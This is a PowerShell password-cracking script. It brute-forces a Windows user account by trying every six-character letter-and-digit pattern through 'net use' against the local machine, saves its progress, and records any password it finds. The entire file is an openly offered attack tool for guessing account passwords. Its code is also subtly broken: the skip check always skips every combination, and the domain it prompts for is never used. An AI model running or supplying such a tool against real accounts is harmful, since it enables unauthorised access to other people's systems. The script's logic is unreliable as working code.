# -----------------------------
# SIGMA LLLNNL PASSWORD CRACKER
# -----------------------------
[console]::Title = "WinCrack LLLNNL"
$letters = 'a'..'z'
$numbers = 0..9
$domain = Read-Host "Domain (leave blank for local)"
$user = Read-Host "Username"
$stateFile = "wincrack_state.txt"
$foundFile = "wincrack_found.txt"
$count = 0

# Load last state
if (Test-Path $stateFile) {
    $count = [int](Get-Content $stateFile)
}

function Try-Crack($password) {
    $cmd = "net use \\127.0.0.1 /user:`"$user`" $password"
    $result = & cmd /c $cmd 2>&1
    if ($LASTEXITCODE -eq 0) { return $true } else { return $false }
}

# Combo generator LLLNNL
for ($l1=0; $l1 -lt $letters.Length; $l1++) {
    for ($l2=0; $l2 -lt $letters.Length; $l2++) {
        for ($l3=0; $l3 -lt $letters.Length; $l3++) {
            for ($n1=0; $n1 -lt $numbers.Length; $n1++) {
                for ($n2=0; $n2 -lt $numbers.Length; $n2++) {
                    for ($l4=0; $l4 -lt $letters.Length; $l4++) {
                        $count++
                        $password = "$($letters[$l1])$($letters[$l2])$($letters[$l3])$($numbers[$n1])$($numbers[$n2])$($letters[$l4])"
                        
                        # Skip combos already tried
                        if ($count -le [int]$count) { continue }

                        Write-Host "[$count] Trying $password ..." -NoNewline

                        if (Try-Crack $password) {
                            Write-Host " ✅ WINNER: $password"
                            $password | Out-File -FilePath $foundFile -Encoding UTF8
                            exit
                        } else {
                            Write-Host " ❌"
                        }

                        # Save progress every 100 combos
                        if ($count % 100 -eq 0) {
                            $count | Out-File -FilePath $stateFile -Encoding UTF8
                        }
                    }
                }
            }
        }
    }
}
